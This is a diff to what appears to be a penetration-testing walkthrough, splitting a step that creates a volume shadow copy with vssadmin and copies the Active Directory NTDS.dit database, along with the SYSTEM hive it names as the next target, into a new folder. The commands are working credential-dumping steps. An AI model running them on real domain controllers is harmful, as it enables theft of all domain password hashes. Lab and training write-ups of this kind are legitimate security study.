@@ -203,7 +203,7 @@ SeCreateSymbolicLinkPrivilege             Create symbolic links                 
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
 ```
 
-Step16. We will now proceed with the **ntds.dit** and **SYSTEM** hive
+Step16. We will now proceed with the **ntds.dit** and **SYSTEM** hive.
 ```cmd
 C:\Windows\system32>vssadmin create shadow /for=C:
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
@@ -212,7 +212,10 @@ vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 Successfully created shadow copy for 'C:\'
     Shadow Copy ID: {4015b1bf-4fda-405e-ac3c-3c6769ff3727}
     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+```
 
+Step17. We will now create a NTDS folder for our extracted ntds and system hive. we will copy both files to the NTDS folder and verified it as well.
+```cmd
 C:\Windows\system32>mkdir C:\NTDS
 
 C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
